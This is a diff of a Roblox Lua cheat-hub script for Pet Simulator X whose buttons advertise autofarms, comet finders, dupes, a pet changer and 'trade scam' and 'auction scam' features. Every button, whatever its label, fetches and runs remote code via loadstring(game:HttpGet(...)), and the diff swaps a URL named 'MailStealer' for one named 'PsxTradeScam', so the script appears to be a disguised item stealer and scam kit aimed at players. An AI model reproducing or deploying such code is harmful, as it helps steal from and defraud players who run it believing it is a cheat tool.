@@ -14,7 +14,7 @@ local MainSection = Main:NewSection("Project WD (keyless)")
 
 
 MainSection:NewButton("Autofarms", "Most Popular Autofarms", function()
-    loadstring(game:HttpGet(""))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()
 end)
 
 
@@ -24,12 +24,12 @@ local CometSniperSection = CometSniper:NewSection("Comet Sniper")
 
 
 CometSniperSection:NewButton("Small Comet Finder V1.5", "ServerHops till it finds comets", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
 CometSniperSection:NewButton("Huge Comet Finder V1.5", "ServerHops till it finds comets", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
@@ -39,7 +39,7 @@ local IndexSpooferSection = IndexSpoofer:NewSection("Index Spoofer")
 
 
 IndexSpooferSection:NewButton("Index Spoofer", "Completes Your Index Instantly", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
@@ -49,7 +49,7 @@ local TradeScamSection = TradeScam:NewSection("Trade Scam")
 
 
 TradeScamSection:NewButton("Trade Scam", "Loads Up Private Trade Scam Script", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
@@ -59,7 +59,7 @@ local AuctionScamSection = AuctionScam:NewSection("Auction Scam")
 
 
 AuctionScamSection:NewButton("Auction Scam", "Loads Up Private Auction Scam Script", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
@@ -69,7 +69,7 @@ local DayCareItemDupeSection = DayCareItemDupe:NewSection("DayCare Item Dupe")
 
 
 DayCareItemDupeSection:NewButton("DayCare Item Dupe", "Dupes The Items You Get In DayCare", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
 
 
@@ -79,5 +79,5 @@ local VisualPetChangerSection = VisualPetChanger:NewSection("Visual Pet Changer"
 
 
 VisualPetChangerSection:NewButton("Visual Pet Changer", "Changes Your Pet", function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlIlI/PartnerPSX/main/MailStealer"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimXScriptsYT/PsxTradeScam/main/PsxTradeScam"))()  --<--your own script on any hithubs but not the top one thats the one that makes the gui
 end)
